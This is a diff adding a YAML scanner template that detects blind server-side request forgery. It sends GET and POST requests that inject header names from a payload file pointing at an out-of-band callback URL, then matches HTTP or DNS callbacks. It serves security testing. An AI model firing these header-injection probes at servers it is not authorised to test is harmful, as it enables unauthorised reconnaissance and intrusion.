@@ -1,0 +1,44 @@
+id: blind-ssrf-via-headers
+
+info:
+  name: Blind SSRF via Headers
+  author: Rikunj Sindhwad
+  severity: high
+  description: Checks for Blind SSRF via headers
+  tags: ssrf,blind,headers
+
+http:
+  - payloads:
+      headers: helpers/payloads/request-headers.txt
+
+    raw:
+      - |
+        GET /#{{headers}}#GET-HTTP1 HTTP/1.1
+        Host: {{Hostname}}
+        {{headers}}: http://{{interactsh-url}}
+
+      - |
+        GET /#{{headers}}#GET-HTTP2 HTTP/2.0
+        Host: {{Hostname}}
+        {{headers}}: http://{{interactsh-url}}
+
+      - |
+        POST /#{{headers}}#POST-HTTP1 HTTP/1.1
+        Host: {{Hostname}}
+        {{headers}}: http://{{interactsh-url}}
+
+        a
+      - |
+        POST /#{{headers}}#POST-HTTP2 HTTP/2.0
+        Host: {{Hostname}}
+        {{headers}}: http://{{interactsh-url}}
+
+        a
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
